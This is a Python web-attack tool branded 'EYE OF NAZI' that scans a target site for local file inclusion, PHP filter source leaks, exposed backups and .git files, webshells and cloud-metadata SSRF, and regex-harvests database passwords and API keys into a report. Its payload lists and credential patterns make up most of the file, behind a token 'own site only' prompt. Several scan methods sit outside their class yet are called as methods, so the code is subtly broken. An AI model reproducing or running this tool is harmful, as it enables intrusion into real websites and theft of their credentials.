#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EYE OF NAZI v54.0 - FILE READER
# Made by Cyber Kurd Team

import sys, os, re, ssl, time, json, base64
import urllib.parse, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

LOGO = r"""
\033[91m\033[1m
   ███████╗██╗   ██╗███████╗     ██████╗ ███████╗     ███╗   ██╗ █████╗ ███████╗██╗
   ██╔════╝╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝     ████╗  ██║██╔══██╗╚══███╔╝██║
   █████╗   ╚████╔╝ █████╗      ██║   ██║█████╗       ██╔██╗ ██║███████║  ███╔╝ ██║
   ██╔══╝    ╚██╔╝  ██╔══╝      ██║   ██║██╔══╝       ██║╚██╗██║██╔══██║ ███╔╝  ██║
   ███████╗   ██║   ███████╗    ╚██████╔╝██║          ██║ ╚████║██║  ██║███████╗██║
   ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝          ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
\033[0m\033[93m\033[1m                    EYE OF NAZI
\033[96m=============================================================\033[0m
\033[97m\033[1m              FILE READER v54.0\033[0m
\033[2m              Made by Cyber Kurd Team\033[0m
\033[96m=============================================================\033[0m
"""

# 50+ URL parameters to test for LFI
LFI_PARAMS = [
    'file', 'page', 'path', 'include', 'inc', 'load', 'read',
    'view', 'template', 'tpl', 'dir', 'folder', 'root', 'doc',
    'document', 'filename', 'name', 'url', 'src', 'source',
    'content', 'show', 'display', 'cat', 'category', 'id',
    'pid', 'post', 'article', 'news', 'item', 'product',
    'mod', 'module', 'action', 'do', 'go', 'goto', 'link',
    'redirect', 'target', 'dest', 'destination', 'r', 'u',
    'f', 'p', 'l', 'c', 'm', 'lang', 'language', 'locale',
]

# LFI payloads
LFI_PAYLOADS = [
    '../../../../../../etc/passwd',
    '../../../../../../etc/shadow',
    '../../../../../../etc/hosts',
    '../../../../../../etc/hostname',
    '../../../../../../etc/group',
    '../../../../../../proc/self/environ',
    '../../../../../../proc/self/cmdline',
    '../../../../../../proc/version',
    '../../../../../../var/log/apache2/access.log',
    '../../../../../../var/log/auth.log',
    '../../../../../../windows/win.ini',
    '..\\..\\..\\..\\..\\..\\windows\\win.ini',
    '....//....//....//....//....//etc/passwd',
    '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    'php://filter/convert.base64-encode/resource=index.php',
    'php://filter/convert.base64-encode/resource=config.php',
    'php://filter/convert.base64-encode/resource=wp-config.php',
    'php://filter/convert.base64-encode/resource=.env',
    'php://input',
    'php://stdin',
    'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
    'expect://id',
    'file:///etc/passwd',
    'file:///c:/windows/win.ini',
    '/etc/passwd',
    '/etc/shadow',
    '/proc/self/environ',
    '/var/log/apache2/access.log',
]

LFI_INDICATORS = [
    'root:x:0:0', 'root:*:0:0', 'daemon:x:', 'bin:x:', 'sys:x:',
    'www-data:', 'nobody:x:', 'sshd:x:',
    '[extensions]', '[fonts]', '[mci extensions]',
    '[boot loader]', '[operating systems]',
    'for 16-bit app support',
]

# Backup files
BACKUP_FILES = [
    'wp-config.php.bak', 'wp-config.php~', 'wp-config.php.old',
    'wp-config.php.save', 'wp-config.php.orig', 'wp-config.php.txt',
    'wp-config.php.swp', 'wp-config.php.swo', 'wp-config.txt',
    '.wp-config.php.swp', '.#wp-config.php',
    'config.php.bak', 'config.php~', 'config.php.old',
    'config.php.save', 'config.php.orig', 'config.php.txt',
    'config.php.swp', 'config.php.swo',
    'configuration.php.bak', 'configuration.php~',
    'config.inc.php.bak', 'config.inc.php~',
    'settings.php.bak', 'settings.php~',
    'database.php.bak', 'database.php~',
    'db.php.bak', 'db.php~',
    'index.php.bak', 'index.php~', 'index.php.old',
    'index.php.save', 'index.php.orig', 'index.php.txt',
    '.index.php.swp', '.index.php.swo',
    'functions.php.bak', 'functions.php~',
    '.env.bak', '.env.old', '.env.save', '.env.orig',
    '.env.backup', '.env.txt', '.env.example',
    'config.json.bak', 'config.json~', 'config.json.old',
    'config.yml.bak', 'config.yml~', 'config.yaml.bak',
    'settings.py.bak', 'settings.py~',
    'database.yml.bak', 'database.yml~',
    'phpinfo.php.bak', 'phpinfo.php~',
    'info.php.bak', 'info.php~',
    'test.php.bak', 'test.php~',
    '.htaccess.bak', '.htaccess~', '.htaccess.old',
    'web.config.bak', 'web.config~',
]

# Git exposure files
GIT_FILES = [
    '.git/config', '.git/HEAD', '.git/index',
    '.git/logs/HEAD', '.git/refs/heads/master',
    '.git/refs/heads/main', '.git/COMMIT_EDITMSG',
    '.git/description', '.git/info/exclude',
    '.gitignore', '.gitmodules', '.gitattributes',
    '.svn/entries', '.svn/wc.db',
    '.hg/hgrc', '.hgignore',
    '.git-credentials', '.gitconfig',
]

# PHP source files
PHP_FILES = [
    'wp-config.php', 'config.php', 'configuration.php',
    'config.inc.php', 'settings.php', 'database.php',
    'db.php', 'connect.php', 'connection.php',
    'includes/config.php', 'includes/db.php',
    'admin/config.php', 'application/config.php',
    'app/config.php', 'core/config.php', 'system/config.php',
    'index.php', 'wp-load.php', 'wp-settings.php',
    'wp-includes/version.php',
]

# Password patterns
PASS_PATTERNS = [
    r'define\s*\(\s*[\'"]DB_NAME[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]DB_USER[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]DB_PASSWORD[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]DB_HOST[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'DB_PASSWORD\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'DB_PASS\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'DB_USER\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'DB_NAME\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'DB_HOST\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'password["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'passwd["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'secret["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'token["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'access[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'secret[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
    r'AKIA[0-9A-Z]{16}',
    r'ghp_[0-9a-zA-Z]{36}',
    r'sk_live_[0-9a-zA-Z]{24,}',
    r'AIza[0-9A-Za-z\-_]{35}',
]

# CMS detectors
CMS_PATHS = {
    'Joomla': ['administrator/', 'components/', 'modules/',
               'plugins/', 'templates/', 'language/',
               'configuration.php', 'htaccess.txt', 'web.config.txt'],
    'Drupal': ['sites/default/', 'core/', 'modules/',
               'themes/', 'profiles/', 'CHANGELOG.txt',
               'INSTALL.txt', 'README.txt'],
    'Laravel': ['storage/', 'bootstrap/', 'artisan',
                'composer.json', 'composer.lock', '.env',
                'config/app.php', 'config/database.php'],
    'Django': ['static/', 'media/', 'manage.py',
               'requirements.txt', 'settings.py', 'urls.py',
               'wsgi.py', 'asgi.py'],
    'CodeIgniter': ['application/', 'system/', 'index.php',
                    'composer.json', '.env'],
    'Symfony': ['bin/', 'config/', 'public/', 'src/',
                'templates/', 'var/', 'vendor/', 'composer.json'],
}

# API endpoints
API_ENDPOINTS = [
    'api', 'api/', 'api/v1', 'api/v1/', 'api/v2', 'api/v2/',
    'api/v3', 'api/v3/', 'api/v4', 'api/v4/',
    'api/users', 'api/user', 'api/admin', 'api/login',
    'api/auth', 'api/config', 'api/status', 'api/health',
    'api/version', 'api/info', 'api/data', 'api/list',
    'api/search', 'api/upload', 'api/download', 'api/file',
    'api/me', 'api/profile', 'api/account', 'api/settings',
    'rest', 'rest/', 'rest/api', 'rest/v1', 'rest/v1/',
    'rest/v2', 'rest/users', 'rest/admin',
    'graphql', 'graphiql', 'graphql.php',
    'swagger', 'swagger.json', 'swagger.yaml',
    'openapi.json', 'openapi.yaml', 'api-docs', 'api-docs/',
    'docs', 'docs/', 'documentation',
    'json', 'json/', 'xml', 'xml/', 'rss', 'rss/', 'atom',
]

# Shell files
SHELL_FILES = [
    'shell.php', 'cmd.php', 'c99.php', 'r57.php', 'b374k.php',
    'webshell.php', 'backdoor.php', 'hack.php', 'upload.php',
    'test.php', 'tmp.php', 'x.php', '1.php', 'a.php',
    '.shell.php', 'shell.phtml', 'shell.php5', 'shell.php7',
]

# Cloud metadata
CLOUD_METADATA = [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://100.100.100.200/latest/meta-data/',
]
# ═══════════════════════════════════════════════════════════════════════════
# HTTP CLIENT
# ═══════════════════════════════════════════════════════════════════════════

class Client:
    def __init__(self, timeout=10, cookie=None, proxy=None):
        self.timeout = timeout
        self.cookie = cookie
        self.proxy = proxy
        self.ua = "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile"

    def req(self, url):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if self.proxy:
            h = urllib.request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
            op = urllib.request.build_opener(h, urllib.request.HTTPSHandler(context=ctx))
        else:
            op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        hdrs = {'User-Agent': self.ua, 'Accept': '*/*', 'Connection': 'close'}
        if self.cookie:
            hdrs['Cookie'] = self.cookie
        r = urllib.request.Request(url, headers=hdrs)
        t0 = time.time()
        try:
            rp = op.open(r, timeout=self.timeout)
            body = rp.read()
            return {'s': rp.getcode(), 't': body.decode('utf-8', 'ignore'),
                    'n': len(body), 'dt': time.time() - t0, 'err': None}
        except urllib.error.HTTPError as e:
            try:
                body = e.read()
            except Exception:
                body = b''
            return {'s': e.code, 't': body.decode('utf-8', 'ignore'),
                    'n': len(body), 'dt': time.time() - t0, 'err': None}
        except Exception as e:
            return {'s': 0, 't': '', 'n': 0, 'dt': time.time() - t0, 'err': str(e)}

# ═══════════════════════════════════════════════════════════════════════════
# SCANNER CLASS
# ═══════════════════════════════════════════════════════════════════════════

class Scan:
    def __init__(self, url, cl, threads=30):
        self.url = url.rstrip('/')
        self.cl = cl
        self.threads = threads
        self.f = []
        self.nt = 0
        self.np = 0
        self.checked = 0
        self.files_read = []
        self.passwords = []

    def add(self, u, p, t, pl, ev, sev):
        self.f.append({'url': u, 'param': p, 'type': t, 'payload': pl,
                       'evidence': ev[:300] if ev else '', 'severity': sev})
        icons = {
            'LFI': '\033[95m[LFI]\033[0m',
            'FILE': '\033[92m[FILE]\033[0m',
            'PHP': '\033[41m\033[97m[PHP]\033[0m',
            'BACKUP': '\033[92m[BACKUP]\033[0m',
            'GIT': '\033[41m\033[97m[GIT]\033[0m',
            'PASSWORD': '\033[41m\033[97m[PASSWORD]\033[0m',
            'CMS': '\033[96m[CMS]\033[0m',
            'API': '\033[96m[API]\033[0m',
            'SHELL': '\033[41m\033[97m[SHELL]\033[0m',
            'CLOUD': '\033[41m\033[97m[CLOUD]\033[0m',
        }
        icon = icons.get(t, '[' + t + ']')
        print("\n  " + icon + " \033[1m" + sev + "\033[0m")
        print("    URL     : " + u[:120])
        if p:
            print("    Param   : \033[93m" + p + "\033[0m")
        if pl:
            print("    Payload : " + pl[:80])
        if ev:
            print("    Evidence: " + ev[:250])

    def inject(self, url, param, payload):
        pr = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(pr.query, keep_blank_values=True)
        qs[param] = [payload]
        new_q = urllib.parse.urlencode(qs, doseq=True)
        return urllib.parse.urlunparse((pr.scheme, pr.netloc, pr.path,
                                         pr.params, new_q, pr.fragment))

    def params(self, url):
        q = urllib.parse.urlparse(url).query
        if not q:
            return []
        return list(urllib.parse.parse_qs(q, keep_blank_values=True).keys())

    def get_forms(self, url):
        r = self.cl.req(url)
        if r['err'] or not r['t']:
            return []
        forms = []
        for fm in re.finditer(r'<form[^>]*>(.*?)</form>',
                              r['t'], re.DOTALL | re.IGNORECASE):
            html = fm.group(1)
            am = re.search(r'action=["\']([^"\']*)["\']', html, re.IGNORECASE)
            mm = re.search(r'method=["\']([^"\']*)["\']', html, re.IGNORECASE)
            action = am.group(1) if am else url
            method = (mm.group(1) if mm else 'get').lower()
            if not action or action == '#':
                action = url
            elif not action.startswith(('http://', 'https://')):
                action = urllib.parse.urljoin(url, action)
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>',
                                html, re.IGNORECASE)
            inputs += re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>',
                                 html, re.IGNORECASE)
            if inputs:
                forms.append({'action': action, 'method': method,
                              'inputs': list(set(inputs))})
        return forms

    def crawl_links(self, url):
        r = self.cl.req(url)
        if r['err'] or not r['t']:
            return []
        links = set()
        for m in re.finditer(r'href=["\']([^"\']+)["\']',
                             r['t'], re.IGNORECASE):
            lk = m.group(1)
            if lk.startswith(('javascript:', '#', 'mailto:', 'tel:')):
                continue
            full = urllib.parse.urljoin(url, lk)
            if self.url.split('//')[1].split('/')[0] in full:
                links.add(full)
        return list(links)

    def extract_passwords(self, text):
        results = []
        for pat in PASS_PATTERNS:
            try:
                for m in re.findall(pat, text, re.IGNORECASE):
                    if isinstance(m, tuple):
                        for x in m:
                            if x and 3 <= len(x) <= 200:
                                results.append(x)
                    elif m and 3 <= len(m) <= 200:
                        results.append(m)
            except Exception:
                pass
        return list(set(results))

    def check_path(self, base, path):
        url = base.rstrip('/') + '/' + path.lstrip('/')
        r = self.cl.req(url)
        self.checked += 1
        if r['err'] or r['s'] != 200:
            return None
        return {'url': url, 's': r['s'], 'n': r['n'], 'path': path, 'text': r['t']}
def test_lfi_auto(self, url):
    """Test all URL parameters with LFI payloads"""
    print("\n\033[96m[1/7]\033[0m LFI Auto Params...")
    params_found = self.params(url)
    # Also test common params even if not in URL
    all_params = list(set(params_found + LFI_PARAMS))
    total = 0
    found = 0
    for p in all_params:
        for pl in LFI_PAYLOADS[:10]:
            test_url = self.inject(url, p, pl)
            r = self.cl.req(test_url)
            total += 1
            if r['err']:
                continue
            hit = False
            for ind in LFI_INDICATORS:
                if ind in r['t']:
                    self.add(test_url, p, 'LFI', pl,
                             "File leaked: " + ind, "CRITICAL")
                    self.files_read.append({'url': test_url, 'param': p,
                                            'payload': pl, 'indicator': ind,
                                            'content': r['t'][:500]})
                    found += 1
                    hit = True
                    break
            if hit:
                break
    print("  \033[92m[+]\033[0m Tested " + str(total) + " | Found " + str(found))

def test_php_filter(self, url):
    """Test PHP filter wrapper"""
    print("\n\033[96m[2/7]\033[0m PHP Filter...")
    params = self.params(url)
    if not params:
        params = ['file', 'page', 'path', 'include']
    filter_payloads = [
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/convert.base64-encode/resource=config.php',
        'php://filter/convert.base64-encode/resource=wp-config.php',
        'php://filter/convert.base64-encode/resource=.env',
        'php://filter/read=convert.base64-encode/resource=index.php',
        'php://filter/read=string.rot13/resource=index.php',
    ]
    found = 0
    for p in params[:5]:
        for pl in filter_payloads:
            test_url = self.inject(url, p, pl)
            r = self.cl.req(test_url)
            if r['err'] or r['s'] != 200:
                continue
            # Try to decode base64
            try:
                b64_match = re.search(r'[A-Za-z0-9+/=]{40,}', r['t'])
                if b64_match:
                    decoded = base64.b64decode(b64_match.group(0)).decode('utf-8', 'ignore')
                    if '<?php' in decoded or 'DB_' in decoded or 'password' in decoded.lower():
                        self.add(test_url, p, 'PHP', pl,
                                 "PHP source leaked (base64 decoded)",
                                 "CRITICAL")
                        self.files_read.append({'url': test_url, 'param': p,
                                                'payload': pl, 'content': decoded[:500]})
                        found += 1
                        break
            except Exception:
                pass
    print("  \033[92m[+]\033[0m Found " + str(found))

def test_backup(self, url):
    """Test backup files"""
    print("\n\033[96m[3/7]\033[0m Backup Files (" + str(len(BACKUP_FILES)) + ")...")
    found = 0
    with ThreadPoolExecutor(max_workers=self.threads) as ex:
        futures = {}
        for p in BACKUP_FILES:
            futures[ex.submit(self.check_path, url, p)] = p
        for fut in as_completed(futures):
            try:
                res = fut.result()
                if res and res['n'] > 0:
                    self.add(res['url'], '', 'BACKUP', '',
                             "Backup exposed (" + str(res['n']) + "B)",
                             "CRITICAL")
                    # Try to extract passwords
                    pwds = self.extract_passwords(res['text'])
                    for pwd in pwds[:3]:
                        self.passwords.append({'url': res['url'],
                                               'password': pwd})
                        self.add(res['url'], '', 'PASSWORD', pwd,
                                 "Password found", "CRITICAL")
                    found += 1
            except Exception:
                pass
    print("  \033[92m[+]\033[0m Found " + str(found))

def test_git(self, url):
    """Test git exposure"""
    print("\n\033[96m[4/7]\033[0m Git Exposure (" + str(len(GIT_FILES)) + ")...")
    found = 0
    with ThreadPoolExecutor(max_workers=self.threads) as ex:
        futures = {}
        for p in GIT_FILES:
            futures[ex.submit(self.check_path, url, p)] = p
        for fut in as_completed(futures):
            try:
                res = fut.result()
                if res and res['n'] > 0:
                    self.add(res['url'], '', 'GIT', '',
                             "Git file exposed (" + str(res['n']) + "B)",
                             "CRITICAL")
                    found += 1
            except Exception:
                pass
    print("  \033[92m[+]\033[0m Found " + str(found))

def test_php_source(self, url):
    """Test direct PHP source access"""
    print("\n\033[96m[5/7]\033[0m PHP Source Direct...")
    found = 0
    for p in PHP_FILES:
        full = url.rstrip('/') + '/' + p
        r = self.cl.req(full)
        if r['err'] or r['s'] != 200:
            continue
        # Check for PHP source
        if '<?php' in r['t'] or 'define(' in r['t'] or 'DB_' in r['t']:
            self.add(full, '', 'PHP', '',
                     "PHP source direct (" + str(r['n']) + "B)",
                     "CRITICAL")
            # Extract passwords
            pwds = self.extract_passwords(r['t'])
            for pwd in pwds[:5]:
                self.passwords.append({'url': full, 'password': pwd})
                self.add(full, '', 'PASSWORD', pwd,
                         "Password found", "CRITICAL")
            found += 1
    print("  \033[92m[+]\033[0m Found " + str(found))

def test_shell_files(self, url):
    """Detect existing shells"""
    print("\n\033[96m[6/7]\033[0m Shell Detector (" + str(len(SHELL_FILES)) + ")...")
    found = 0
    for p in SHELL_FILES:
        full = url.rstrip('/') + '/' + p
        r = self.cl.req(full)
        if r['err'] or r['s'] != 200:
            continue
        if any(x in r['t'].lower() for x in
               ['cmd', 'exec', 'system', 'shell_exec', 'passthru']):
            self.add(full, '', 'SHELL', '',
                     "Shell file detected!", "CRITICAL")
            found += 1
    print("  \033[92m[+]\033[0m Found " + str(found))

def test_cms(self, url):
    """Detect CMS"""
    print("\n\033[96m[7/7]\033[0m CMS Detection...")
    found = 0
    for cms, paths in CMS_PATHS.items():
        hits = 0
        for p in paths:
            full = url.rstrip('/') + '/' + p
            r = self.cl.req(full)
            if not r['err'] and r['s'] in (200, 301, 302, 403):
                hits += 1
        if hits >= 2:
            self.add(url, '', 'CMS', '',
                     cms + " detected (" + str(hits) + " paths)",
                     "HIGH")
            found += 1
    print("  \033[92m[+]\033[0m Found " + str(found) + " CMS")
def fuzz_api(self, url):
    """Fuzz API endpoints"""
    print("\n\033[96m[*]\033[0m API Fuzzing (" + str(len(API_ENDPOINTS)) + ")...")
    found = 0
    with ThreadPoolExecutor(max_workers=self.threads) as ex:
        futures = {}
        for p in API_ENDPOINTS:
            futures[ex.submit(self.check_path, url, p)] = p
        for fut in as_completed(futures):
            try:
                res = fut.result()
                if res and res['s'] in (200, 401, 403):
                    self.add(res['url'], '', 'API', '',
                             "API endpoint (" + str(res['s']) + ")",
                             "MEDIUM")
                    found += 1
            except Exception:
                pass
    print("  \033[92m[+]\033[0m Found " + str(found))

def test_cloud(self, url):
    """Test cloud metadata"""
    print("\n\033[96m[*]\033[0m Cloud Metadata...")
    params = self.params(url)
    if not params:
        params = ['url', 'file', 'path', 'src']
    found = 0
    for p in params[:3]:
        for meta in CLOUD_METADATA:
            test_url = self.inject(url, p, meta)
            r = self.cl.req(test_url)
            if r['err']:
                continue
            for ind in ['ami-id', 'instance-id', 'access_key',
                        'secret_key', 'computeMetadata']:
                if ind in r['t']:
                    self.add(test_url, p, 'CLOUD', meta,
                             "Cloud metadata: " + ind, "CRITICAL")
                    found += 1
                    break
    print("  \033[92m[+]\033[0m Found " + str(found))

def save_json(self, filename):
    """Save findings as JSON"""
    data = {
        'target': self.url,
        'findings': self.f,
        'files_read': self.files_read,
        'passwords': self.passwords,
    }
    with open(filename, 'w', encoding='utf-8') as fp:
        json.dump(data, fp, indent=2, ensure_ascii=False)
    print("\033[92m[+]\033[0m JSON saved: " + filename)

def run_all(self):
    print("\n\033[96m" + "=" * 60 + "\033[0m")
    print("\033[1m  [*] TARGET: " + self.url + "\033[0m")
    print("\033[96m" + "=" * 60 + "\033[0m")

    # 1. LFI Auto
    try:
        self.test_lfi_auto(self.url)
    except Exception as e:
        print("  \033[91m[!]\033[0m " + str(e))

    # 2. PHP Filter
    try:
        self.test_php_filter(self.url)
    except Exception as e:
        print("  \033[91m[!]\033[0m " + str(e))

    # 3. Backup
    try:
        self.test_backup(self.url)
    except Exception as e:
        print("  \033[91m[!]\033[0m " + str(e))

    # 4. Git
    try:
        self.test_git(self.url)
    except Exception as e:
        print("  \033[91m[!]\033[0m " + str(e))

    # 5. PHP Source
    try:
        self.test_php_source(self.url)
    except Exception as e:
        print("  \033[91m[!]\033[0m " + str(e))

    # 6. Shell
    try:
        self.test_shell_files(self.url)
    except Exception as e:
        print("  \033[91m[!]\033[0m " + str(e))

    # 7. CMS
    try:
        self.test_cms(self.url)
    except Exception as e:
        print("  \033[91m[!]\033[0m " + str(e))

    # 8. API
    try:
        self.fuzz_api(self.url)
    except Exception as e:
        print("  \033[91m[!]\033[0m " + str(e))

    # 9. Cloud
    try:
        self.test_cloud(self.url)
    except Exception as e:
        print("  \033[91m[!]\033[0m " + str(e))

    # Final report
    print("\n\033[96m" + "=" * 60 + "\033[0m")
    crit = sum(1 for f in self.f if f['severity'] == 'CRITICAL')
    high = sum(1 for f in self.f if f['severity'] == 'HIGH')
    med = sum(1 for f in self.f if f['severity'] == 'MEDIUM')
    print("  Files Checked: " + str(self.checked))
    print("  Files Read: " + str(len(self.files_read)))
    print("  Passwords Found: \033[1m\033[91m" + str(len(self.passwords)) + "\033[0m")
    print("  Findings: \033[1m\033[91m" + str(len(self.f)) + "\033[0m")
    print("    \033[41m\033[97m CRITICAL \033[0m " + str(crit))
    print("    \033[43m HIGH     \033[0m " + str(high))
    print("    \033[93m MEDIUM   \033[0m " + str(med))
    print("\033[96m" + "=" * 60 + "\033[0m\n")
# ═══════════════════════════════════════════════════════════════════════════
# AUTO-DETECT + MAIN
# ═══════════════════════════════════════════════════════════════════════════

def is_url(text):
    if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(/.*)?$', text):
        return True
    if text.startswith(('http://', 'https://')):
        return True
    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', text):
        return True
    if text.startswith('localhost'):
        return True
    return False


def normalize_url(text):
    if not text.startswith(('http://', 'https://')):
        text = 'http://' + text
    return text


def main():
    print(LOGO)
    print("\n\033[96m" + "=" * 60 + "\033[0m")
    print("\033[92m  File Reader - Type your OWN site domain.\033[0m")
    print("\033[93m  Warning: Use only on YOUR OWN site!\033[0m")
    print("\033[96m" + "=" * 60 + "\033[0m")
    print("\n\033[93mAccepted formats:\033[0m")
    print("  \033[92mkurd4u.com\033[0m              - Domain")
    print("  \033[92mhttps://kurd4u.com\033[0m      - With protocol")
    print("  \033[92mhttp://kurd4u.com/path\033[0m  - Full URL")
    print("  \033[92m192.168.1.1\033[0m             - IP address")
    print("\n\033[93mOther commands:\033[0m")
    print("  \033[92mcookie <value>\033[0m   - Set cookie")
    print("  \033[92mproxy <URL>\033[0m      - Set proxy")
    print("  \033[92mthreads <N>\033[0m      - Set thread count")
    print("  \033[92msave <file>\033[0m      - Save JSON report")
    print("  \033[92mstatus\033[0m           - Show settings")
    print("  \033[92mclear\033[0m            - Clear screen")
    print("  \033[92mexit\033[0m             - Quit\n")

    st = {'cookie': None, 'proxy': None, 'threads': 30, 'last': None}

    while True:
        try:
            line = input("\033[1m\033[92mnazi\033[0m\033[93m@\033[0m"
                         "\033[96mforge\033[0m \033[94m>>\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n\033[93m[!] Bye\033[0m")
            break

        if not line:
            continue

        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ""

        if cmd in ('exit', 'quit', 'q'):
            print("\033[93mBye.\033[0m")
            break
        elif cmd == 'cookie':
            if arg:
                st['cookie'] = arg
                print("\033[92m[+] Cookie set\033[0m")
            else:
                print("\033[91m[!] cookie <value>\033[0m")
        elif cmd == 'proxy':
            if arg:
                st['proxy'] = arg
                print("\033[92m[+] Proxy set\033[0m")
            else:
                print("\033[91m[!] proxy <URL>\033[0m")
        elif cmd == 'threads':
            if arg:
                try:
                    st['threads'] = int(arg)
                    print("\033[92m[+] Threads: " + arg + "\033[0m")
                except Exception:
                    print("\033[91m[!] threads <number>\033[0m")
            else:
                print("\033[91m[!] threads <number>\033[0m")
        elif cmd == 'status':
            print("\n\033[96mSettings:\033[0m")
            print("  Cookie  : " + str(st['cookie'] or '(none)'))
            print("  Proxy   : " + str(st['proxy'] or '(none)'))
            print("  Threads : " + str(st['threads']) + "\n")
        elif cmd == 'clear':
            os.system('clear')
            print(LOGO)
        elif cmd == 'save':
            if st['last'] and arg:
                st['last'].save_json(arg)
            else:
                print("\033[91m[!] save <filename>\033[0m")
        elif is_url(cmd):
            url = normalize_url(cmd)
            print("\n\033[93m[!]\033[0m Only use on YOUR OWN site!")
            print("\033[93m[?]\033[0m Scanning: \033[1m" + url + "\033[0m")
            conf = input("\033[93m    Confirm you own this site? (yes/no): \033[0m").strip().lower()
            if conf not in ('yes', 'y', 'بەڵێ', 'b'):
                print("\033[93m[!] Aborted.\033[0m")
                continue
            cl = Client(timeout=10, cookie=st['cookie'], proxy=st['proxy'])
            sc = Scan(url, cl, threads=st['threads'])
            try:
                sc.run_all()
                st['last'] = sc
            except KeyboardInterrupt:
                print("\n\033[93m[!] Stopped\033[0m")
                st['last'] = sc
            except Exception as e:
                print("\n\033[91m[!] Error: " + str(e) + "\033[0m")
        else:
            print("\033[91m[!] Unknown: " + cmd + "\033[0m")
            print("\033[93m    Type a domain or 'help'\033[0m")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[93m[!] Bye\033[0m")
